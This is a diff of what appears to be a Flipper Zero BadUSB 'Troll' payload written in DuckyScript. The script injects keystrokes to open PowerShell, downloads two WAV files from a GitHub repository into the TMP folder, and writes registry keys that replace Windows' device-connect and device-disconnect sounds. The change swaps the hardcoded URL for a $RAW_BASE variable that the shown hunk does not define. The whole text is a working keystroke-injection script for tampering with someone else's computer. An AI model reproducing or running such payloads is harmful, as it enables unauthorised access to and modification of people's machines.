@@ -5,7 +5,7 @@ DELAY 300
 STRING powershell
 ENTER
 DELAY 300
-ALTSTRING $TmpPath = [System.Environment]::GetEnvironmentVariable("TMP"); Invoke-WebRequest -Uri https://github.com/estebanramos/FlipperZero-BadUSB/raw/main/Payloads/Troll/Device%20Connect/device-connected.wav -OutFile $TmpPath/dc.wav;  Invoke-WebRequest -Uri https://github.com/estebanramos/FlipperZero-BadUSB/raw/main/Payloads/Troll/Device%20Connect/device-disconnected.wav -OutFile $TmpPath/dd.wav
+ALTSTRING $TmpPath = [System.Environment]::GetEnvironmentVariable("TMP"); Invoke-WebRequest -Uri $RAW_BASE/Payloads/Troll/Device%20Connect/device-connected.wav -OutFile $TmpPath/dc.wav;  Invoke-WebRequest -Uri $RAW_BASE/Payloads/Troll/Device%20Connect/device-disconnected.wav -OutFile $TmpPath/dd.wav
 ENTER
 DELAY 500
 ALTSTRING $wshell = New-Object -ComObject WScript.Shell; $wshell.RegWrite("HKCU\AppEvents\Schemes\Apps\.Default\DeviceConnect\.Current\","$TmpPath\dc.wav","REG_SZ");$wshell.RegWrite("HKCU\AppEvents\Schemes\Apps\.Default\DeviceDisconnect\.Current\","$TmpPath\dd.wav","REG_SZ")
